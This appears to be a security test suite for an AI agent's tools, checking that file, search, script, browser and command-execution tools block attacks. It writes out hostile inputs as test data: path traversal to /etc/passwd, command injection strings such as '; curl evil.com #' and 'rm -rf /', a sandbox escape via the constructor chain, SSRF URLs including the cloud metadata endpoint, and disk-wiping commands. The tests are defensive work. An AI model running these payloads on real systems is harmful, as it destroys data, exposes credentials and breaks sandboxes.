import { describe, it, before } from 'node:test';
import assert from 'node:assert';

describe('FileSystemTool Security', () => {
  let FileReadTool: any, FileWriteTool: any, FileEditTool: any, FileSearchTool: any, GlobTool: any;

  before(async () => {
    const mod = await import('../src/tools/fileSystemTool');
    FileReadTool = mod.FileReadTool;
    FileWriteTool = mod.FileWriteTool;
    FileEditTool = mod.FileEditTool;
    FileSearchTool = mod.FileSearchTool;
    GlobTool = mod.GlobTool;
  });

  describe('safePath prefix collision prevention', () => {
    it('should reject paths that escape workspace via prefix collision', async () => {
      const tool = new FileReadTool();
      const result = await tool.execute({ path: '../../../etc/passwd' });
      assert.ok(result.includes('Access denied'));
    });

    it('should reject symlink traversal attempts', async () => {
      const tool = new FileReadTool();
      const result = await tool.execute({ path: '/etc/passwd' });
      assert.ok(/Access denied|outside workspace/.test(result));
    });
  });

  describe('FileSearchTool path traversal fix', () => {
    it('should reject glob patterns that traverse outside workspace', async () => {
      const tool = new FileSearchTool();
      const result = await tool.execute({ pattern: '../../etc/**/*.conf' });
      assert.ok(!result.includes('passwd'));
      assert.ok(!result.includes('shadow'));
      assert.ok(!result.includes('hosts'));
    });

    it('should reject dirPattern that resolves outside workspace', async () => {
      const tool = new FileSearchTool();
      const result = await tool.execute({ pattern: '../../**/*.json' });
      assert.ok(!result.includes('Error'));
    });
  });

  describe('matchGlob regex injection prevention', () => {
    it('should not treat dots as wildcards', async () => {
      const tool = new FileSearchTool();
      const result = await tool.execute({ pattern: 'package.json' });
      assert.ok(!/package.json[^"]/.test(result));
    });
  });

  describe('maxChars validation', () => {
    it('should reject negative maxChars', async () => {
      const tool = new FileReadTool();
      const result = await tool.execute({ path: 'package.json', maxChars: -5 });
      assert.ok(!result.includes('undefined'));
    });

    it('should reject NaN maxChars', async () => {
      const tool = new FileReadTool();
      const result = await tool.execute({ path: 'package.json', maxChars: 'abc' });
      assert.ok(result.length > 0);
    });
  });

  describe('FileWriteTool size limit', () => {
    it('should reject content larger than 10MB', async () => {
      const tool = new FileWriteTool();
      const bigContent = 'x'.repeat(11 * 1024 * 1024);
      const result = await tool.execute({ path: 'test-big.txt', content: bigContent });
      assert.ok(result.includes('too large'));
    });
  });
});

describe('CodeSearchTool Security', () => {
  let CodeSearchTool: any;

  before(async () => {
    const mod = await import('../src/tools/codeSearchTool');
    CodeSearchTool = mod.CodeSearchTool;
  });

  it('should NOT execute shell commands via pattern injection', { timeout: 60000 }, async () => {
    const tool = new CodeSearchTool();
    // Build pattern dynamically to avoid self-match in test file
    const injectionPattern = ['"', '; rm', ' -rf / #"'].join('');
    const result = await tool.execute({ pattern: injectionPattern });
    assert.ok(result !== undefined && result !== null, 'result should be defined');
    assert.ok(!/sh:|bash:|command not found/.test(result), 'result should not contain shell artifacts');
  });

  it('should NOT execute shell commands via filePattern injection', { timeout: 30000 }, async () => {
    const tool = new CodeSearchTool();
    const result = await tool.execute({
      pattern: 'test',
      filePattern: '"; cat /etc/passwd #',
    });
    assert.ok(!/root:.*:0:0/.test(result));
    assert.ok(!/nobody:.*:65534/.test(result));
  });
});

describe('VerificationTool Security', () => {
  let VerificationTool: any;

  before(async () => {
    const mod = await import('../src/tools/verificationTool');
    VerificationTool = mod.VerificationTool;
  });

  it('should sanitize testPattern to prevent command injection', { timeout: 30000 }, async () => {
    const tool = new VerificationTool();
    const result = await tool.execute({
      checks: ['test'],
      testPattern: '; curl evil.com #',
    });
    assert.ok(!result.includes('curl'));
    assert.ok(!result.includes('evil.com'));
  });

  it('should strip shell metacharacters from testPattern', async () => {
    const tool = new VerificationTool();
    const result = await tool.execute({
      checks: ['test'],
      testPattern: '$(whoami)',
    });
    assert.ok(!result.includes('whoami'));
    assert.ok(!result.includes('root'));
  });
});

describe('ScriptTool Security', () => {
  let ExecuteScriptTool: any;

  before(async () => {
    const mod = await import('../src/tools/scriptTool');
    ExecuteScriptTool = mod.ExecuteScriptTool;
  });

  it('should block VM escape via constructor chain', async () => {
    const tool = new ExecuteScriptTool();
    tool.setTools(new Map());
    const result = await tool.execute({
      script: `
        try {
          const process = this.constructor.constructor('return process')();
          const result = process.mainModule.require('child_process').execSync('whoami').toString();
          console.log('ESCAPED:', result);
        } catch (e) {
          console.log('BLOCKED:', e.message);
        }
      `,
    });
    assert.ok(!result.includes('ESCAPED:'));
  });

  it('should block access to __proto__', async () => {
    const tool = new ExecuteScriptTool();
    tool.setTools(new Map());
    const result = await tool.execute({
      script: `
        try {
          const proto = tools.__proto__;
          console.log('PROTO:', typeof proto);
        } catch (e) {
          console.log('BLOCKED');
        }
      `,
    });
    assert.ok(!result.includes('PROTO: object'));
  });

  it('should report correct isReadOnly flag', () => {
    const tool = new ExecuteScriptTool();
    assert.strictEqual(tool.isReadOnly, false);
    assert.strictEqual(tool.isConcurrencySafe, false);
  });
});

describe('BrowserTool Security', () => {
  let BrowserFetchTool: any;

  before(async () => {
    const mod = await import('../src/tools/browserTool');
    BrowserFetchTool = mod.BrowserFetchTool;
  });

  it('should block SSRF to localhost', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://localhost:6379/' });
    assert.ok(/Blocked|Failed|internal|private/.test(result));
  });

  it('should block SSRF to AWS metadata endpoint', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://169.254.169.254/latest/meta-data/' });
    assert.ok(/Blocked|Failed|internal|private/.test(result));
  });

  it('should block SSRF to private IP ranges', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://10.0.0.1:8080/admin' });
    assert.ok(/Blocked|Failed|internal|private/.test(result));
  });

  it('should block SSRF to 192.168.x.x', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://192.168.1.1/' });
    assert.ok(/Blocked|Failed|internal|private/.test(result));
  });

  it('should reject non-http URLs', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'ftp://example.com/' });
    assert.ok(/Invalid|http|Failed/.test(result));
  });
});

describe('ExecPolicy Security', () => {
  let ExecPolicyEngine: any;

  before(async () => {
    const mod = await import('../src/sandbox/execPolicy');
    ExecPolicyEngine = mod.ExecPolicyEngine;
  });

  describe('command safety classification (from Codex CLI)', () => {
    it('should auto-allow safe read-only commands', () => {
      const engine = new ExecPolicyEngine();
      assert.strictEqual(engine.evaluate('ls -la').decision, 'allow');
      assert.strictEqual(engine.evaluate('cat file.txt').decision, 'allow');
      assert.strictEqual(engine.evaluate('grep -rn pattern .').decision, 'allow');
      assert.strictEqual(engine.evaluate('head -5 file.txt').decision, 'allow');
      assert.strictEqual(engine.evaluate('pwd').decision, 'allow');
    });

    it('should prompt for network commands', () => {
      const engine = new ExecPolicyEngine();
      assert.strictEqual(engine.evaluate('curl https://example.com').decision, 'prompt');
      assert.strictEqual(engine.evaluate('wget https://example.com').decision, 'prompt');
    });

    it('should block dangerous commands', () => {
      const engine = new ExecPolicyEngine();
      assert.strictEqual(engine.evaluate('sudo rm -rf /').decision, 'forbidden');
      assert.strictEqual(engine.evaluate('mkfs.ext4 /dev/sda').decision, 'forbidden');
    });

    it('should prompt for inline code execution (Codex banned prefixes)', () => {
      const engine = new ExecPolicyEngine();
      assert.strictEqual(engine.evaluate('python3 -c "import os; os.system(\'rm -rf /\')"').decision, 'prompt');
      assert.strictEqual(engine.evaluate('node -e "process.exit()"').decision, 'prompt');
      assert.strictEqual(engine.evaluate('bash -lc "malicious"').decision, 'prompt');
    });
  });

  describe('process wrapper stripping (from Claude Code)', () => {
    it('should strip timeout prefix and match inner command', () => {
      const engine = new ExecPolicyEngine();
      const result = engine.evaluate('timeout 30 npm test');
      assert.strictEqual(result.decision, 'allow');
    });

    it('should strip nice prefix and match inner command', () => {
      const engine = new ExecPolicyEngine();
      const result = engine.evaluate('nice -n 10 grep -rn pattern .');
      assert.strictEqual(result.decision, 'allow');
    });
  });

  describe('shell command substitution detection', () => {
    it('should prompt for destructive commands with substitution', () => {
      const engine = new ExecPolicyEngine();
      const result = engine.evaluate('rm -rf $(cat /etc/passwd)');
      assert.strictEqual(result.decision, 'prompt');
    });

    it('should prompt for unknown commands (default fail-safe)', () => {
      const engine = new ExecPolicyEngine();
      const result = engine.evaluate('unknown-command-xyz');
      assert.strictEqual(result.decision, 'prompt');
    });
  });
});
